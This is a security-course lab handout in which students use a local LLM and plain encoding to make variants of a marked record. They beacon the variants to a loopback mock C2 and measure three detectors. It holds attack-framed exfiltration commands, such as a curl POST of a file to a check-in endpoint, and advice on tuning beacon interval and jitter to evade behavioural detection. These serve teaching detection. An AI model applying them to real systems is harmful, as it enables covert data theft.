# Lab 7 — AI-powered attack orchestration

**Time:** 12–15 minutes · You write no code.

Lines marked 🅱️ are the **core attack commands**. Beginner mode runs only those.
Expert mode runs the whole list.

---

## The question

An LLM can rewrite your beacon a hundred ways in a minute. **What does that actually
buy you?**

In labs 3 to 6 the model was the victim. Here it is *your* tool and you are the attacker.
You have one record to move off a workstation and three detectors in the way.

---

## Architecture

```
  record.txt                     the thing you need to move. One line. Never changes.
  LAB-BEACON-7742                the marker inside it. This is our EICAR.
      |
      |   python variants.py --formats json,csv,kv,xml,urlq
      v
  Qwen2.5-1.5B-Instruct Q4_K_M   local, CPU, temperature 0, no network
      |                          five renderings, ~35 s
      |
      |   python variants.py --encode base64,hex
      v
  base64.b64encode / .hex()      two lines of stdlib. The model CANNOT do this.
      |
      |   python beacon.py --all
      v
  collector.py  127.0.0.1:8007   the mock "C2". Appends to collector.log. Not published.
      |
      v
  collector.log  <-------------- the ONLY thing the detectors read
      |
      +--> detect.py --signature    D1  one string match
      +--> detect.py --structural   D2  decode, split, count the record's values
      +--> detect.py --behaviour    D3  cadence and volume. Reads no payload at all.
```

Nothing executes. Nothing persists. Nothing connects out. The container is run with
`--network none` and the collector binds loopback only.

---

## The vulnerable configuration

The vulnerability here is **not in a model or in an application**. It is in a detection
rule, and it is the most common one there is:

```python
if "LAB-BEACON-7742".lower() in body.lower():
    alert()
```

One string. It keys on how the data *looks* rather than on what the data *is*. Anything
that changes the rendering beats it — including, as you are about to see, two lines of
Python that need no AI at all.

---

## Mapping

**MITRE ATLAS leads this lab**, and that is deliberate. OWASP's Top 10 for LLM
Applications describes risks in software *you build*. An attacker using an LLM to help
them work is a fact about the threat landscape, not a vulnerability in your application —
so this is the one lab in the course whose topic sits outside it. Forcing a fit would
teach you a false idea of what the Top 10 is for.

**MITRE ATLAS v5.6.0**

| | |
|---|---|
| `AML.TA0003` → **`AML.T0016.002`** | Obtain Capabilities: **Generative AI** — *"obtain generative AI models or tools, such as large language models, to assist them in various steps of their operation … serve them locally using frameworks such as Ollama or vLLM"* |
| `AML.TA0001` → `AML.T0043.003` | Craft Adversarial Data: Manual Modification |
| `AML.TA0007` → **`AML.T0015`** | **Evade AI Model** — *"evade AI-based virus/malware detection or network scanning"* ← the core technique |
| `AML.TA0014` → `AML.T0096` | AI Service API as a C2 channel — **cited, not built** |

**Two real case studies, not hypotheticals:**

- **`AML.CS0000`** — Palo Alto Networks tested a deep-learning detector for malware C2
  traffic, then crafted evasion samples by *removing header fields not used for C2*.
  **The crafted packets were identified as benign with over 80 % confidence.** That is
  step 4 of this lab with the names changed.
- **`AML.CS0044`** — **LAMEHUG** (APT28 / UAC-0001, 2025, CERT-UA#16039) called the
  **Qwen 2.5 Coder 32B Instruct** model to generate its commands on infected hosts. You
  are about to use the same model family, three sizes down. Note what it used the LLM
  *for*: command **text**. Not encoding. Step 2 explains why.
- **`AML.CS0032`** — attackers modified brand logos, evaded the visual-similarity model,
  and **the other components of the ensemble caught the phishing sites anyway.** That is
  step 5 in one sentence.

**OWASP GenAI LLM Top 10 (2026)** — second here, and genuinely exercised:

- **`LLM10:2026` Improper Output Handling**, Scenario #2 — *"the LLM can **encode** the
  sensitive data and send it, without any output validation or filtering, to an
  attacker-controlled server."* Risk #5 is the phishing half. Prevention #7 asks for
  detection of *unusual patterns* in model output — patterns, not strings, which is D2.
- **`LLM02:2026` Sensitive Information Disclosure**, via OWASP's own ATLAS cross-map —
  *"Cross-lingual, **Base64, and hex encodings defeat regex and blocklist data-loss
  filters**."* OWASP asserts it; step 4 measures it.
- **`LLM06:2026` Unbounded Consumption** — cited as the **mirror**, not a mapping. LLM06 is
  cost asymmetry pointed at the defender. Step 7 measures cost asymmetry pointed back at
  the attacker.

---

## The commands

🅱️ = core, run by both modes. Unmarked = expert only.

```bash
# --- expert only: get into the lab folder ---
cd /labs/lab7
cat record.txt
cat schedule.txt

# --- the attack ---
🅱️ python variants.py --formats json,csv,kv,xml,urlq
🅱️ python variants.py --encode base64,hex
   python variants.py --show
🅱️ python beacon.py --all

# --- expert only: run the collector yourself and send something by hand ---
   python collector.py &
   curl -s -X POST --data-binary @record.txt \
        -H 'X-Lab-Variant: byhand' http://127.0.0.1:8007/checkin
   cat collector.log
   kill %1

# --- the detectors ---
🅱️ python detect.py --signature
🅱️ python detect.py --structural
🅱️ python detect.py --behaviour
🅱️ python detect.py --behaviour --interval 7200 --jitter 0.95

# --- expert only: choose your own schedule and find the FASTEST clean setting ---
   nano schedule.txt
   python detect.py --behaviour

# --- expert only: try a format that was measured to FAIL ---
   python variants.py --formats ini

# --- the evidence ---
🅱️ python evidence.py
   python check.py
```

---

## The steps

### 1 · Ask the model to re-encode the record — 🅱️

`python variants.py --formats json,csv,kv,xml,urlq`

Ask the model to re-encode the check-in record into five ordinary data formats. You will
see the exact prompt before it is sent. Five generations on your CPU — about a minute,
longer on 2 cores.

> **^** Five renderings of the same record, every field intact, in about a minute. That is
> the part the marketing is about, and it is real — the model is genuinely good at this.
>
> **^** Now read the prompt again. It asked for a format change and nothing else. No
> jailbreak, no roleplay, nothing a safety filter would refuse and nothing a prompt scanner
> would flag. **The offence is not in the prompt. It is in what you do next.**
>
> **^** Look closely at the CSV. You asked for a header row and one data row and got six
> `key,value` lines. It did not do what it was told, and it did it identically every time.
> Hold on to that — it comes back in step 2.

### 2 · Two more renderings, without the model — 🅱️

`python variants.py --encode base64,hex`

base64 and hex, from two lines of Python. Instant.

> **^** Two lines of standard library, no model, correct every time.
>
> **^** **The model cannot do this.** Measured on this exact model at temperature 0: asked
> for base64 it loops for 49 seconds and produces garbage, and with a stricter prompt it
> answers `SGVsbG8gd29ybGQ=` — which is base64 for *"Hello world"*. It returned a memorised
> string instead of encoding your input. Hex fails the same way. A model is a **paraphraser,
> not a computer**: it cannot do an exact transform on data it has not seen. Encoding,
> checksums, crypto and packing are all exact transforms.
>
> **^** This is why LAMEHUG used a Qwen model for command *text* and ordinary code for
> everything that had to be right. Real operators already know where the tool stops.

### 3 · Send them to the collector — 🅱️

`python beacon.py --all`

Send all of them to the collector on `127.0.0.1:8007` inside this container. Nothing leaves
your machine and no port is published. From here on, the detectors only see the collector's
log.

> **^** From here on the detectors read `collector.log` and nothing else. They never see
> `variants.json`. That asymmetry is real: a defender does not get the attacker's working
> files, only what arrived.

This step also prints **what a real operator's endpoint would have received** — the request
line, the headers, the volume. The lab stops there on purpose. See *"Why there is no remote
endpoint"* below.

### 4 · The signature rule — 🅱️

`python detect.py --signature`

The rule most environments actually have: one string, one match. Which of your variants get
past it?

> **^** Your five AI variants: **all caught.** The ~35 seconds of generation bought nothing
> at all against this rule.
>
> **^** The 2 that got through — `base64`, `hex` — are the two the model could not write. The
> evasion that worked came from `base64.b64encode`, and it is free.
>
> **^** This is ATLAS `AML.CS0000` in miniature: Palo Alto's crafted C2 packets were called
> benign with over 80 % confidence, and what they did was remove header fields. Surface work
> beats surface rules.

### 5 · The structural detector — 🅱️

`python detect.py --structural`

A detector that does not care what format anything is in. It decodes, splits, and counts how
many of the record's values are still there. Twenty lines.

> **^** All of them. Including base64 and hex.
>
> **^** D2 never asks what format anything is in. It decodes what looks encoded, splits on
> everything, and counts how many of the record's values survived. Every variant still
> carries the record, **because the record is the thing you needed to send** — so the record
> is what a good detector keys on.
>
> **^** Polymorphic and undetectable are not the same word. `AML.CS0032` is the field
> version: attackers modified brand logos, evaded the visual-similarity model, and the other
> components of the ensemble caught the phishing sites anyway.

### 6 · The detector that reads no payload — 🅱️

`python detect.py --behaviour`

A third detector, and this one never reads your payload at all. It reads the two numbers in
`schedule.txt`: how often you check in and how much you randomise it.

> **^** Flagged, and not one byte of your payload was read. Every variant you generated is
> invisible to this detector, and so is every variant you could ever generate.
>
> **^** Both limbs tripped: 1440 check-ins is far over the volume threshold, and a cv of
> 0.000 says you are a timer.
>
> **^** Content was never the only signal. This is a crude two-limb version of what
> [RITA](https://github.com/activecm/rita) scores on — interval consistency, size uniformity
> and dispersion.

### 7 · Get under it, and read the bill — 🅱️

`python detect.py --behaviour --interval 7200 --jitter 0.95`

Slow the beacon down and randomise it hard. Watch the **throughput** line as well as the
verdict — it is the part that matters.

> **^** Clean. Read the throughput line again, though.
>
> **^** You went from 60.00 records an hour to 0.75. That is **80× slower**. Moving 500
> records went from 8 hours to **28 days**.
>
> **^** And notice **which limb** forced that. Jitter alone beats the regularity limb *for
> free* — measured at 60 s with 60 % jitter: clean on regularity, and slightly **faster**
> than the baseline. It is the **volume** limb that costs, because no amount of irregularity
> changes a count.
>
> **^** That is the lesson: **one detector dimension is nearly free to beat. Two orthogonal
> ones are a bill, and the defender sets the price.**

Expert mode: `nano schedule.txt` and find the *fastest* setting that still comes out clean.
7200 s / 95 % is handed to you and it is **not** the optimum.

### 8 · The evidence — 🅱️

`python evidence.py`

What you spent, what you got, and what it cost.

---

## How this differs from a real attack

| This lab | A real attack |
|---|---|
| the record is one text line | variation is tied to a live payload |
| a mock collector on loopback | infrastructure the operator owns |
| the marker is `LAB-BEACON-7742` | no marker, and nothing announces itself |
| you try two settings by hand | they iterate against a copy of the detector until something passes |
| our own three detectors | an ensemble, tuned, and updated |

**Two of those gaps are on purpose.**

**There is no evasion-optimisation loop in this lab, and there never will be.** A program
that tests variants against a detector and refines until one passes is an offensive tool no
matter how harmless the payload is. It is the one thing this lab was explicitly built
without. You set two numbers by hand, twice, and read the bill.

### Why there is no remote endpoint

A real endpoint on a domain the instructor controls was proposed and reconsidered four
times across labs 3 to 7. The answer is no, permanently, and this lab is the clearest case:
it is *about* beaconing on a timer to a collector. A security professional's work laptop
running a "hacking lab" that then makes periodic timed check-ins to an unfamiliar external
domain is not something EDR *might* flag — it is the textbook detection, and step 7 would be
tuning the interval of a real one. So step 3 prints what a real operator's endpoint would
have received and stops there. Same lesson, nobody's SOC paged.

---

## The defence

1. **Key on the record, not the rendering.** D2 is twenty lines and it caught everything D1
   missed. If your rule can be beaten by base64, it can be beaten by a first-year script and
   no AI at all.
2. **Normalise before you match.** Decode, unescape, flatten, *then* apply the rule. Every
   detector in this lab that worked did this.
3. **Have a signal the payload cannot touch.** Cadence, volume, destination rarity, session
   length. Those are what made the attacker pay.
4. **Make them orthogonal.** One dimension is nearly free to beat — measured, at zero cost
   to the attacker's throughput. Two dimensions that fail independently force a real
   slowdown.
5. **Price your detectors, do not just count what they catch.** *"80× slower"* is a number a
   defender can take to a budget meeting. *"We block 12,000 signatures"* is not.
6. **Do not buy "AI-powered" as a threat multiplier without asking what it multiplies.**
   Here it multiplied the thing that was already cheap and already caught.

---

## Notes on the toolchain, for the curious

- **Our marker is an EICAR.** NVIDIA's [garak](https://github.com/NVIDIA/garak) has an
  `av_spam_scanning` probe that checks whether a model will emit **EICAR**, **GTUBE** and
  **GTPHISH** — the industry-standard *harmless* test signatures that exist precisely so a
  detector can be proven to fire without anyone handling real malware. `LAB-BEACON-7742` is
  the same idea. It is a real convention, not a lab contrivance.
- **The professional version of step 1** is Microsoft's
  [PyRIT](https://github.com/microsoft/PyRIT) converter pipeline — base64, ROT13, leetspeak,
  homoglyph, Unicode confusables. Worth reading. Note that its Tree-of-Attacks orchestrator
  is the refine-until-it-passes loop this lab deliberately does not ship.
- **The professional version of D3** is [RITA](https://github.com/activecm/rita), and
  ActiveCM's free [beacon threat-hunting lab](https://activecm.github.io/threat-hunting-labs/beacons/)
  is the defender's side of this exercise done properly, with real PCAP. Recommended
  follow-up if this lab interested you.
- **Formats that were measured and FAIL on this model**, so you do not waste time:
  `ini` returns bare `[section]` headers and drops every value (0/6 fields, confidently,
  identically on three runs); `syslog` keeps the fields but produces no syslog framing, and
  supplying a worked example made it *worse*; `base64` and `hex` do not work at all. The full
  table is at the top of `variants.py`.

---

## Submit

Paste the three numbers from `evidence.py` into the class chat: what the model produced,
what the signature rule missed, and the slowdown it took to go clean.

The full transcript is saved to `lab7-results.txt`.
